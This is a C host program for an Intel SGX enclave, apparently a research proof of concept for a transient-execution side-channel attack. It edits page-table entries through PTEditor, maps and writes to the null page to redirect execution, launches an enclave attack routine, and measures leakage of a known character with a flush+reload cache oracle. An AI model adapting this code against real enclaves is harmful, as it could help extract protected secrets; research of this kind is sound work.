/*
 * Copyright (C) 2011-2017 Intel Corporation. All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 *   * Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *   * Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in
 *     the documentation and/or other materials provided with the
 *     distribution.
 *   * Neither the name of Intel Corporation nor the names of its
 *     contributors may be used to endorse or promote products derived
 *     from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <stdio.h>
#include <string.h>
#include <assert.h>

#include <unistd.h>
#include <pwd.h>
#include <pthread.h>
#define MAX_PATH FILENAME_MAX

#include "sgx_urts.h"
#include "App.h"
#include "Enclave_u.h"
#include "errors.h"
#include "../cacheutils.h"
#include "../ptedit_header.h"
#include "../conf.h"

/* Global EID shared by multiple threads */
sgx_enclave_id_t global_eid = 0;

char __attribute__((aligned(0x1000))) oracle[4096 * 256] = {};

/* Initialize the enclave:
 *   Step 1: try to retrieve the launch token saved by last transaction
 *   Step 2: call sgx_create_enclave to initialize an enclave instance
 *   Step 3: save the launch token if it is updated
 */
int initialize_enclave(void)
{
  char token_path[MAX_PATH] = {'\0'};
  sgx_launch_token_t token = {0};
  sgx_status_t ret = SGX_ERROR_UNEXPECTED;
  int updated = 0;

  /* Step 1: try to retrieve the launch token saved by last transaction 
     *         if there is no token, then create a new one.
     */
  /* try to get the token saved in $HOME */
  const char *home_dir = getpwuid(getuid())->pw_dir;

  if (home_dir != NULL &&
      (strlen(home_dir) + strlen("/") + sizeof(TOKEN_FILENAME) + 1) <= MAX_PATH)
  {
    /* compose the token path */
    strncpy(token_path, home_dir, strlen(home_dir));
    strncat(token_path, "/", strlen("/"));
    strncat(token_path, TOKEN_FILENAME, sizeof(TOKEN_FILENAME) + 1);
  }
  else
  {
    /* if token path is too long or $HOME is NULL */
    strncpy(token_path, TOKEN_FILENAME, sizeof(TOKEN_FILENAME));
  }

  FILE *fp = fopen(token_path, "rb");
  if (fp == NULL && (fp = fopen(token_path, "wb")) == NULL)
  {
    printf("Warning: Failed to create/open the launch token file \"%s\".\n", token_path);
  }

  if (fp != NULL)
  {
    /* read the token from saved file */
    size_t read_num = fread(token, 1, sizeof(sgx_launch_token_t), fp);
    if (read_num != 0 && read_num != sizeof(sgx_launch_token_t))
    {
      /* if token is invalid, clear the buffer */
      memset(&token, 0x0, sizeof(sgx_launch_token_t));
      printf("Warning: Invalid launch token read from \"%s\".\n", token_path);
    }
  }
  /* Step 2: call sgx_create_enclave to initialize an enclave instance */
  /* Debug Support: set 2nd parameter to 1 */
  ret = sgx_create_enclave(ENCLAVE_FILENAME, SGX_DEBUG_FLAG, &token, &updated, &global_eid, NULL);
  if (ret != SGX_SUCCESS)
  {
    print_error_message(ret);
    if (fp != NULL)
      fclose(fp);
    return -1;
  }

  /* Step 3: save the launch token if it is updated */
  if (updated == FALSE || fp == NULL)
  {
    /* if the token is not updated, or file handler is invalid, do not perform saving */
    if (fp != NULL)
      fclose(fp);
    return 0;
  }

  /* reopen the file with write capablity */
  fp = freopen(token_path, "wb", fp);
  if (fp == NULL)
    return 0;
  size_t write_num = fwrite(token, 1, sizeof(sgx_launch_token_t), fp);
  if (write_num != sizeof(sgx_launch_token_t))
    printf("Warning: Failed to save launch token to \"%s\".\n", token_path);
  fclose(fp);
  return 0;
}


/* OCall functions */
void ocall_print_string(const char *str)
{
  /* Proxy/Bridge will check the length and null-terminate 
     * the input string to prevent buffer overflow. 
     */
  printf("%s", str);
}


void ocall_modify_page(void *ptr)
{

  

  //printf("ocall modify page %p\n", ptr);
  void *aligned_addr = (void *)((size_t)ptr & ~(0xFFFull));
  //printf("clearing access bit for addr %p\n", aligned_addr);
  ptedit_entry_t vm = ptedit_resolve(aligned_addr, 0);
  vm.pte &= ~(1ull << PTEDIT_PAGE_BIT_ACCESSED);
  vm.valid = PTEDIT_VALID_MASK_PTE;
  ptedit_update(aligned_addr, 0, &vm);
}

void ocall_check_oracle(void *dummy)
{
  
  static unsigned count = 0;
  static unsigned transient = 0;
  static unsigned other = 0;

  count++;
  bool z = false;
  for (int i = 0; i < 256; i++)
  {
    if (flush_reload(oracle + i * 4096))
    {
      if (i == LEAKAGE_CHAR)
      {
        transient++;
      }
      else
      {
        other++;
      }
    }
  }

  if (!(count % 1000))
  {
    printf("total: %d\n", count);
    printf("transient %c: %u (%3.2f%%)\n", LEAKAGE_CHAR, transient, (float)transient / count * 100);
    printf("other: %u (%3.2f%%)\n", other, (float)other / count * 100);
    printf("\r\033[3A");
    //fflush(stdout);
  }
}

char __attribute__((aligned(0x1000))) user_page[4096];

/* Application entry */
int SGX_CDECL main(int argc, char *argv[])
{

  CACHE_MISS = detect_flush_reload_threshold();
  printf("Cache miss @ %zd\n", CACHE_MISS);
  (void)(argc);
  (void)(argv);

  if (ptedit_init())
  {
    printf("Error: Could not initalize PTEditor, did you load the kernel module?\n");
    return 1;
  }

  memset(oracle, 1, sizeof(oracle));

  /* Initialize the enclave */
  if (initialize_enclave() < 0)
  {
    return -1;
  }

  void *redir_function;
  ecall_get_function(global_eid, &redir_function);

  printf("outside address of oraculate: %p\n", redir_function);



  //setup nullpage
  char *null_page = 0;
  mprotect(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC);
  asm volatile("movq %1, (%0)\n" : : "r"(0), "r"(redir_function) : "rax"); //-O3 compiler doesn't like address 0


  printf("outside oracle at %p\n", (void *)oracle);
  ecall_run_attack(global_eid, oracle);


  /* Destroy the enclave */
  sgx_destroy_enclave(global_eid);

  printf("\n\n\n");

  printf("Info: Enclave successfully returned.\n");
  return 0;
}
